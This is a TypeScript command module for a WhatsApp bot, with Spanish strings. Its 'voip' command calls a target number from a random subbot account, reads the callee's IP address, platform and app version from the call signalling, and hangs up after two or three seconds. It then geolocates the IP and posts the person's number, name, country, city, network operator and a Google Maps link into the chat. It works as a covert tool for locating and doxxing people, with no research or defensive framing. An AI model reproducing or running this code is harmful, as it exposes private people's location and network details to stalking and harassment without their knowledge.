import { randomBytes } from "node:crypto";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const SWN = "@s.whatsapp.net";
const seen = new WeakSet<object>();
const log = (...a: any[]) => process.env.VOIP_DEBUG === "1" && console.log("[voip]", ...a);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

type Pend = {
  chat: string;
  sock: any;
  target: string;
  cmdMsg: any;
  callId?: string;
  ip?: string;
  platform?: string;
  version?: string;
  done: boolean;
  timer?: NodeJS.Timeout;
};

const P: Map<string, Pend> = ((globalThis as any).__voipPending ??= new Map());
const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
const bare = (j: string) => `${digits(j)}${SWN}`;

function walk(n: any, o: any[] = []): any[] {
  if (!n) return o;
  o.push(n);
  if (Array.isArray(n.content)) for (const k of n.content) walk(k, o);
  return o;
}

function findNet(n: any): string | undefined {
  for (const x of walk(n)) {
    if (String(x?.tag || "").toLowerCase().includes("net")) {
      const a = x.attrs || {};
      const addr = a.addr || a.ip || a.host;
      if (addr && /\d+\.\d+\.\d+\.\d+/.test(String(addr))) return String(addr).split(":")[0];
    }
  }
  return undefined;
}

function attrsOf(n: any) {
  const o: Record<string, string> = {};
  for (const x of walk(n)) {
    const a = x.attrs || {};
    if (a.platform && !o.platform) o.platform = String(a.platform);
    if (a.version && !o.version) o.version = String(a.version);
  }
  return o;
}

async function geo(ip: string) {
  if (!ip) return null;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "voip" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch { return null; }
}

/* ───────────────────────── subbots ───────────────────────── */

function pool(ctx: any): any[] {
  const G = globalThis as any;
  const c = [G.subbots, G.__subbots, G.subbotManager?.list, G.subbotManager?.all, G.subbotManager?.sockets, ctx.subbots, ctx.subbotManager?.list];
  for (const x of c) {
    if (!x) continue;
    let arr: any[] = [];
    if (typeof x.values === "function") arr = [...x.values()];
    else if (Array.isArray(x)) arr = x;
    else if (typeof x === "object") arr = Object.values(x);
    const s = arr.map((v: any) => v?.sock ?? v?.client ?? v).filter((v: any) => v && typeof v.sendMessage === "function" && v.ws && v.sendNode);
    if (s.length) return s;
  }
  return [];
}

/* ───────────────────────── listener ───────────────────────── */

function hook(sock: any) {
  if (seen.has(sock)) return;
  seen.add(sock);

  sock.ws.on("CB:call", (node: any) => {
    try {
      const first = Array.isArray(node?.content) ? node.content[0] : null;
      const tag = String(first?.tag || "").toLowerCase();
      const who = digits(String(node?.attrs?.from || first?.attrs?.["call-creator"] || ""));
      const callId = String(first?.attrs?.["call-id"] || first?.attrs?.call_id || "");
      const p = P.get(who);
      log("CB:call", tag, who);
      if (!p || p.done) return;

      if (tag === "offer" || tag === "preaccept" || tag === "accept" || tag === "transport") {
        const a = attrsOf(first);
        if (a.platform) p.platform = a.platform;
        if (a.version) p.version = a.version;
        const ip = findNet(first) || findNet(node);
        if (ip) p.ip = ip;
      }

      if (tag === "accept" && !p.done) {
        p.callId = callId || p.callId;
        if (p.timer) clearTimeout(p.timer);
        p.timer = setTimeout(() => finish(p).catch(() => undefined), 2000 + Math.floor(Math.random() * 1000));
      }
    } catch {}
  });
}

async function hangup(sock: any, target: string, callId?: string) {
  try {
    await sock.sendNode({
      tag: "call",
      attrs: { to: bare(target), id: sock.generateMessageTag?.() || `${Date.now()}` },
      content: [{ tag: "terminate", attrs: callId ? { "call-id": callId } : {} }],
    });
  } catch {}
}

/* ───────────────────────── oferta ───────────────────────── */

function newCallId() {
  return ("00" + randomBytes(16).toString("hex").slice(2)).toUpperCase();
}

async function offer(sock: any, target: string, callId: string): Promise<string> {
  for (const fn of ["offerCall", "sendCallOffer", "callOffer"]) {
    if (typeof sock[fn] === "function") {
      try { await sock[fn](bare(target)); return "nativo"; } catch (e) { log(fn, "falló"); }
    }
  }

  const B: any = await import("baileys");
  const { encodeWAMessage, encodeSignedDeviceIdentity, getBinaryNodeChild, jidNormalizedUser } = B;

  const meId = sock.authState?.creds?.me?.id || sock.user?.id;
  const meLid = sock.authState?.creds?.me?.lid;
  const pn = bare(target);

  let lid: string | undefined;
  try { lid = await sock.signalRepository?.lidMapping?.getLIDForPN?.(pn); } catch {}
  const peerLid = lid || pn;

  for (const j of [pn, peerLid]) { try { await sock.presenceSubscribe?.(j); } catch {} }
  await sleep(700);

  let devs: string[] = [];
  try {
    const list = await sock.getUSyncDevices([peerLid], true, false);
    devs = (list || []).map((d: any) => d.jid).filter(Boolean);
  } catch (e) { log("devices falló"); }

  const jidDecode = B.jidDecode;
  const norm = (j: string) => {
    const d = jidDecode?.(j);
    if (!d?.user) return j;
    const srv = j.endsWith("@lid") ? "lid" : "s.whatsapp.net";
    return d.device != null ? `${d.user}:${d.device}@${srv}` : `${d.user}@${srv}`;
  };

  const destinations = (devs.length ? devs : [peerLid]).map(norm).slice(0, 5);
  const primary = destinations[0];

  /* sesiones Signal */
  const targets = [...new Set(destinations.flatMap((j) => {
    const d = jidDecode?.(j);
    return d?.device ? [norm(j.split(":")[0] + "@" + j.split("@")[1]), j] : [j];
  }))];

  try {
    const keyNode = await sock.query({
      tag: "iq",
      attrs: { xmlns: "encrypt", type: "get", to: SWN },
      content: [{ tag: "key", attrs: {}, content: targets.map((j) => ({ tag: "user", attrs: { jid: j } })) }],
    });
    await B.parseAndInjectE2ESessions(keyNode, sock.signalRepository);
  } catch (e) { log("sesiones falló"); }

  const callKey = randomBytes(32);
  let needIdentity = false;

  const destNodes: any[] = [];
  for (const j of destinations) {
    try {
      const { type, ciphertext } = await sock.signalRepository.encryptMessage({
        jid: j,
        data: encodeWAMessage({ call: { callKey: Buffer.from(callKey) } }),
      });
      if (type === "pkmsg") needIdentity = true;
      destNodes.push({
        tag: "to",
        attrs: { jid: j },
        content: [{ tag: "enc", attrs: { v: "2", type, count: "1" }, content: Buffer.from(ciphertext) }],
      });
    } catch (e) { log("cifrado falló", j); }
  }
  if (!destNodes.length) throw new Error("no se pudo cifrar para ningún dispositivo");

  const rootEnc = getBinaryNodeChild(destNodes[0], "enc");
  const creator = meId.includes(":") ? jidNormalizedUser(meId) : jidNormalizedUser(meId).replace("@", `:${(jidDecode?.(meId)?.device ?? 0)}@`);

  const content: any[] = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "net", attrs: { medium: "2", protocol: "0" } },
    { tag: "capability", attrs: { ver: "1" }, content: Buffer.from([0x01, 0x04, 0x05, 0x09, 0x0a, 0x0b, 0x11]) },
    { tag: "destination", attrs: {}, content: destNodes },
  ];
  if (rootEnc) content.push({ ...rootEnc, attrs: { ...rootEnc.attrs, count: String(destNodes.length) } });
  content.push({ tag: "encopt", attrs: { keygen: "2" } });
  if (needIdentity && sock.authState?.creds?.account) {
    try { content.push({ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }); } catch {}
  }

  await sock.sendNode({
    tag: "call",
    attrs: { to: primary, id: sock.generateMessageTag?.() || `${Date.now()}` },
    content: [{
      tag: "offer",
      attrs: {
        "call-creator": creator,
        "call-id": callId,
        e: "1",
        t: String(Math.floor(Date.now() / 1000)),
        platform: "web",
        version: "2.3000.1037863797",
      },
      content,
    }],
  });

  if (meLid) log("meLid", meLid);
  return "manual";
}

/* ───────────────────────── cierre ───────────────────────── */

async function finish(p: Pend) {
  if (p.done) return;
  p.done = true;
  if (p.timer) clearTimeout(p.timer);
  P.delete(digits(p.target));

  await hangup(p.sock, p.target, p.callId);

  const ip = p.ip || "";
  const g = await geo(ip);
  const num = digits(p.target);

  let name = "";
  try {
    const r: any = await p.sock.onWhatsApp?.(num).catch(() => null);
    name = r?.[0]?.notify || "";
  } catch {}

  const lines = [
    `📞 *Llamada registrada*`,
    name ? `Contacto: ${name}` : "",
    `Número: +${num}`,
    g ? `País: ${g.country || "?"}` : "",
    g ? `Ciudad: ${g.city || "?"}${g.region ? ` (${g.region})` : ""}` : "",
    ip ? `IP: \`${ip}\`` : "IP: `relay`",
    `Plataforma: ${p.platform || "desconocida"}`,
    p.version ? `Versión: ${p.version}` : "",
    g?.org ? `Red: ${g.org}` : "",
    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
    `Hora: ${new Date().toLocaleString("es-MX")}`,
  ].filter(Boolean);

  await p.sock.sendMessage(p.chat, { text: lines.join("\n") }, { quoted: p.cmdMsg }).catch(() => undefined);
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["voip", "llamar", "call"],
  category: "system",
  description: "Llama desde un subbot al azar, cuelga a los 2-3 s y devuelve IP, país, ciudad, plataforma y versión.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const raw = (args[0] || "").replace(/\D/g, "");
    const quoted: string | undefined = info.participant;

    let target: string;
    if (raw.length >= 8) target = bare(raw);
    else if (quoted) target = bare(quoted);
    else if (info.mentionedJid?.length) target = bare(info.mentionedJid[0]);
    else {
      await reply("Uso: `.voip +573118353868` o responde a alguien.").catch(() => undefined);
      return;
    }

    const key = digits(target);
    if (P.has(key)) {
      await reply(`Ya hay una llamada en curso a +${key}.`).catch(() => undefined);
      return;
    }

    const subs = pool(ctx);
    const list = subs.length ? subs : [sock];
    const callSock = list[Math.floor(Math.random() * list.length)];

    hook(callSock);

    const p: Pend = { chat: from, sock: callSock, target, cmdMsg: msg, done: false };
    P.set(key, p);

    await react("📞").catch(() => undefined);

    const me = digits(callSock.authState?.creds?.me?.id || callSock.user?.id || "");
    await reply(`📞 Marcando a +${key} desde \`${me}\`${subs.length ? ` (subbot ${list.indexOf(callSock) + 1}/${list.length})` : ""}…`).catch(() => undefined);

    const callId = newCallId();
    try {
      await offer(callSock, target, callId);
    } catch (e: any) {
      P.delete(key);
      await react("❌").catch(() => undefined);
      await reply(`No se pudo marcar: ${e?.message || e}`).catch(() => undefined);
      return;
    }

    p.timer = setTimeout(async () => {
      if (p.done) return;
      p.done = true;
      P.delete(key);
      await hangup(callSock, target, callId);
      await reply(`⏱️ +${key} no contestó.`).catch(() => undefined);
    }, 45000);
  },
};
